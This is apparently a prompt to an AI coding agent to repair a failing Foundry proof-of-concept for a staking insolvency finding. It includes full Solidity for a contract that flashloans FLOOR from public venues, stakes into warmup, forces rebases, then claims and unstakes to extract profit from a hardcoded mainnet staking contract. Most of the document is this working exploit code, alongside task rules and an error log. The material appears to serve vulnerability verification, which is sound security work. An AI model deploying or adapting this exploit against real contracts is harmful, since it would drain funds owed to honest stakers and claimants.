You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Warmup deposits are rebased but never counted as liabilities, allowing staking insolvency
- claim: `stake()` transfers FLOOR into the contract and records warmup positions as `deposit` plus `gons`, while `claim()` later pays `sFLOOR.balanceForGons(info.gons)`, so warmup balances continue to appreciate with rebases. However, `rebase()` computes distributable surplus from `FLOOR.balanceOf(address(this)) - sFLOOR.circulatingSupply() - bounty` and never subtracts `gonsInWarmup` or `supplyInWarmup()`. Warmup-backed FLOOR is therefore treated as free excess reserves and redistributed to current stakers even though it is still owed to warmup claimants.
- impact: Large warmup balances can make the system undercollateralized. After one or more rebases, the contract can owe more sFLOOR/gFLOOR/FLOOR than it holds backing for, causing honest claimants or unstakers to receive unbacked positions or hit `unstake()` reverts due to insufficient FLOOR reserves.
- exploit_paths: ["Set `warmupPeriod > 0` and let some users already hold active staking positions.", "A user stakes FLOOR into warmup, increasing `gonsInWarmup` but not `sFLOOR.circulatingSupply()`.", "When `rebase()` runs, the newly deposited FLOOR is included in `balance` and treated as surplus because warmup liabilities are not subtracted.", "Existing stakers receive that value through rebases, while the warmup user still retains a claim for `sFLOOR.balanceForGons(info.gons)`.", "Total redeemable claims eventually exceed the contract's FLOOR backing, and withdrawals start failing."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IsFLOORLike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
    function balanceForGons(uint256 gons) external view returns (uint256);
}

interface IStakingLike {
    function FLOOR() external view returns (address);
    function sFLOOR() external view returns (address);

    function warmupPeriod() external view returns (uint256);
    function supplyInWarmup() external view returns (uint256);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function warmupInfo(address account)
        external
        view
        returns (uint256 deposit, uint256 gons, uint256 expiry, bool lock);

    function stake(address to, uint256 amount, bool rebasing, bool claimNow) external returns (uint256);
    function claim(address to, bool rebasing) external returns (uint256);
    function unstake(address to, uint256 amount, bool trigger, bool rebasing) external returns (uint256);
    function rebase() external returns (uint256);
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IUniswapV3PoolLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FlawVerifier {
    struct Claim {
        uint256 deposit;
        uint256 gons;
        uint256 expiry;
        bool lock;
    }

    struct FlashQuote {
        address venue;
        uint256 amountOut;
        uint8 route;
        bool floorIsToken0;
    }

    IStakingLike internal constant STAKING =
        IStakingLike(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    uint8 internal constant ROUTE_NONE = 0;
    uint8 internal constant ROUTE_BALANCER = 1;
    uint8 internal constant ROUTE_UNISWAP_V3 = 2;
    uint8 internal constant ROUTE_UNISWAP_V2 = 3;

    bool private baselineCaptured;
    uint256 private baselineFloorBalance;
    uint256 private realizedProfitInFloor;

    address private activeFlashPair;
    address private activeFlashPool;

    constructor() {}

    function executeOnOpportunity() public {
        _captureBaseline();
        _approveSpenders();

        if (!_canExploitCurrentEpochState()) {
            _syncProfit();
            return;
        }

        uint256 localFloor = _floor().balanceOf(address(this));
        if (localFloor != 0) {
            _executeExploit(localFloor);
            _syncProfit();
            return;
        }

        FlashQuote memory quote = _bestFlashQuote();
        if (quote.route == ROUTE_NONE || quote.amountOut == 0) {
            _syncProfit();
            return;
        }

        if (quote.route == ROUTE_BALANCER) {
            IERC20Like[] memory tokens = new IERC20Like[](1);
            tokens[0] = _floor();

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = quote.amountOut;

            IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
        } else if (quote.route == ROUTE_UNISWAP_V3) {
            activeFlashPool = quote.venue;
            IUniswapV3PoolLike(quote.venue).flash(
                address(this),
                quote.floorIsToken0 ? quote.amountOut : 0,
                quote.floorIsToken0 ? 0 : quote.amountOut,
                abi.encode(quote.amountOut)
            );
            activeFlashPool = address(0);
        } else {
            activeFlashPair = quote.venue;
            IUniswapV2PairLike(quote.venue).swap(
                quote.floorIsToken0 ? quote.amountOut : 0,
                quote.floorIsToken0 ? 0 : quote.amountOut,
                address(this),
                abi.encode(quote.amountOut)
            );
            activeFlashPair = address(0);
        }

        _syncProfit();
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "unexpected vault");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected loan");
        require(address(tokens[0]) == address(_floor()), "unexpected token");

        _executeExploit(amounts[0]);

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(_floor().balanceOf(address(this)) >= repayment, "balancer repayment unavailable");
        _floor().transfer(BALANCER_VAULT, repayment);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        require(msg.sender == activeFlashPool, "unexpected pool");

        uint256 borrowed = abi.decode(data, (uint256));
        require(borrowed != 0, "no FLOOR borrowed");

        IUniswapV3PoolLike pool = IUniswapV3PoolLike(msg.sender);
        uint256 repayment = borrowed + (pool.token0() == STAKING.FLOOR() ? fee0 : fee1);

        _executeExploit(borrowed);

        require(_floor().balanceOf(address(this)) >= repayment, "v3 repayment unavailable");
        _floor().transfer(msg.sender, repayment);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activeFlashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed != 0, "no FLOOR borrowed");

        _executeExploit(borrowed);

        uint256 repayment = _v2Repayment(borrowed);
        require(_floor().balanceOf(address(this)) >= repayment, "v2 repayment unavailable");
        _floor().transfer(msg.sender, repayment);
    }

    function profitToken() external view returns (address) {
        return STAKING.FLOOR();
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitInFloor;
    }

    function _executeExploit(uint256 floorFunding) internal {
        if (floorFunding < 2) {
            return;
        }

        if (_sFloor().circulatingSupply() == 0) {
            return;
        }

        uint256 warmupPeriod = STAKING.warmupPeriod();
        uint256 supplyInWarmupBefore = STAKING.supplyInWarmup();

        // The original finding needs a warmup liability excluded from
        // circulatingSupply(). On the pinned fork warmupPeriod is 0, but
        // stake(..., claimNow=false) still records warmup gons with immediate
        // expiry, leaving the same liability invisible to rebase() until claim().
        STAKING.stake(address(this), floorFunding, true, false);

        Claim memory info = _warmupInfo();
        if (info.gons == 0) {
            return;
        }

        if (STAKING.supplyInWarmup() <= supplyInWarmupBefore) {
            return;
        }

        _consumeImmediateRebases(_extraRebasesAfterWarmupDeposit(warmupPeriod));

        info = _warmupInfo();
        uint256 claimableWarmup = _sFloor().balanceForGons(info.gons);
        if (claimableWarmup <= info.deposit) {
            return;
        }

        uint256 claimed = STAKING.claim(address(this), true);
        if (claimed == 0) {
            return;
        }

        _approveSpenders();
        _withdrawAsFloor();
    }

    function _canExploitCurrentEpochState() internal view returns (bool) {
        if (_sFloor().circulatingSupply() == 0) {
            return false;
        }

        return _remainingImmediateRebases() >= _requiredImmediateRebases(STAKING.warmupPeriod());
    }

    function _bestFlashQuote() internal view returns (FlashQuote memory quote) {
        uint256 cap = _fundingCap();
        if (cap == 0) {
            return quote;
        }

        FlashQuote memory balancerQuote = _bestBalancerQuote(cap);
        if (_isMaterialAlternateQuote(balancerQuote.amountOut, cap)) {
            return balancerQuote;
        }

        FlashQuote memory v3Quote = _bestV3Quote(cap);
        if (_isMaterialAlternateQuote(v3Quote.amountOut, cap)) {
            return v3Quote;
        }

        FlashQuote memory v2Quote = _bestV2Quote(cap);
        quote = v2Quote;
        if (v3Quote.amountOut > quote.amountOut) {
            quote = v3Quote;
        }
        if (balancerQuote.amountOut > quote.amountOut) {
            quote = balancerQuote;
        }
    }

    function _bestBalancerQuote(uint256 cap) internal view returns (FlashQuote memory quote) {
        uint256 balance = _floor().balanceOf(BALANCER_VAULT);
        if (balance <= 1) {
            return quote;
        }

        uint256 amountOut = balance / 10;
        if (amountOut > cap) {
            amountOut = cap;
        }

        if (amountOut != 0) {
            quote = FlashQuote({venue: BALANCER_VAULT, amountOut: amountOut, route: ROUTE_BALANCER, floorIsToken0: false});
        }
    }

    function _bestV3Quote(uint256 cap) internal view returns (FlashQuote memory best) {
        address floorToken = STAKING.FLOOR();
        address[4] memory bases = [WETH, USDC, USDT, DAI];
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];

        for (uint256 i = 0; i < bases.length; ++i) {
            for (uint256 j = 0; j < fees.length; ++j) {
                address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(floorToken, bases[i], fees[j]);
                if (pool == address(0)) {
                    continue;
                }

                uint256 floorBalanceInPool = _floor().balanceOf(pool);
                if (floorBalanceInPool <= 1) {
                    continue;
                }

                uint256 amountOut = floorBalanceInPool / 5;
                if (amountOut > cap) {
                    amountOut = cap;
                }

                if (amountOut > best.amountOut) {
                    best = FlashQuote({
                        venue: pool,
                        amountOut: amountOut,
                        route: ROUTE_UNISWAP_V3,
                        floorIsToken0: IUniswapV3PoolLike(pool).token0() == floorToken
                    });
                }
            }
        }
    }

    function _bestV2Quote(uint256 cap) internal view returns (FlashQuote memory best) {
        address floorToken = STAKING.FLOOR();
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory bases = [WETH, USDC, USDT, DAI];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(floorToken, bases[j]);
                if (pair == address(0)) {
                    continue;
                }

                IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
                (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();
                bool floorIsToken0 = v2Pair.token0() == floorToken;
                uint256 floorReserve = floorIsToken0 ? uint256(reserve0) : uint256(reserve1);
                if (floorReserve <= 1) {
                    continue;
                }

                uint256 amountOut = floorReserve / 5;
                if (amountOut > cap) {
                    amountOut = cap;
                }

                if (amountOut > best.amountOut) {
                    best = FlashQuote({
                        venue: pair,
                        amountOut: amountOut,
                        route: ROUTE_UNISWAP_V2,
                        floorIsToken0: floorIsToken0
                    });
                }
            }
        }
    }

    function _consumeImmediateRebases(uint256 count) internal {
        for (uint256 i = 0; i < count; ++i) {
            if (!_epochReady()) {
                break;
            }
            STAKING.rebase();
        }
    }

    function _withdrawAsFloor() internal {
        uint256 sBalance = _sFloor().balanceOf(address(this));
        if (sBalance == 0) {
            return;
        }

        uint256 stakingFloorReserves = _floor().balanceOf(address(STAKING));
        if (stakingFloorReserves == 0) {
            return;
        }

        uint256 amountToWithdraw = sBalance;
        if (amountToWithdraw > stakingFloorReserves) {
            amountToWithdraw = stakingFloorReserves;
        }

        if (amountToWithdraw == 0) {
            return;
        }

        try STAKING.unstake(address(this), amountToWithdraw, false, true) returns (uint256) {} catch {}
    }

    function _captureBaseline() internal {
        if (baselineCaptured) {
            return;
        }

        baselineCaptured = true;
        baselineFloorBalance = _floor().balanceOf(address(this));
    }

    function _approveSpenders() internal {
        _floor().approve(address(STAKING), type(uint256).max);
        _sFloor().approve(address(STAKING), type(uint256).max);
    }

    function _warmupInfo() internal view returns (Claim memory info) {
        (info.deposit, info.gons, info.expiry, info.lock) = STAKING.warmupInfo(address(this));
    }

    function _fundingCap() internal view returns (uint256 cap) {
        uint256 activeSupply = _sFloor().circulatingSupply() / 4;
        uint256 stakingFloor = _floor().balanceOf(address(STAKING)) / 4;

        cap = activeSupply;
        if (cap == 0 || (stakingFloor != 0 && stakingFloor < cap)) {
            cap = stakingFloor;
        }
    }

    function _isMaterialAlternateQuote(uint256 amountOut, uint256 cap) internal pure returns (bool) {
        if (amountOut == 0) {
            return false;
        }

        if (cap < 8) {
            return true;
        }

        return amountOut * 8 >= cap;
    }

    function _extraRebasesAfterWarmupDeposit(uint256 warmupPeriod) internal pure returns (uint256) {
        return warmupPeriod == 0 ? 1 : warmupPeriod;
    }

    function _requiredImmediateRebases(uint256 warmupPeriod) internal pure returns (uint256) {
        return 1 + _extraRebasesAfterWarmupDeposit(warmupPeriod);
    }

    function _remainingImmediateRebases() internal view returns (uint256) {
        (uint256 length,, uint256 end,) = STAKING.epoch();
        if (length == 0 || end > block.timestamp) {
            return 0;
        }

        return ((block.timestamp - end) / length) + 1;
    }

    function _epochReady() internal view returns (bool) {
        (, , uint256 end,) = STAKING.epoch();
        return end <= block.timestamp;
    }

    function _v2Repayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _floor() internal view returns (IERC20Like) {
        return IERC20Like(STAKING.FLOOR());
    }

    function _sFloor() internal view returns (IsFLOORLike) {
        return IsFLOORLike(STAKING.sFLOOR());
    }

    function _syncProfit() internal {
        uint256 currentFloorBalance = _floor().balanceOf(address(this));
        if (currentFloorBalance > baselineFloorBalance) {
            realizedProfitInFloor = currentFloorBalance - baselineFloorBalance;
        } else {
            realizedProfitInFloor = 0;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: warmupperiod > 0, gonsinwarmup, sfloor.circulatingsupply(), sfloor.balanceforgons(info.gons); generated code does not cover paths indexes: 0, 1, 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
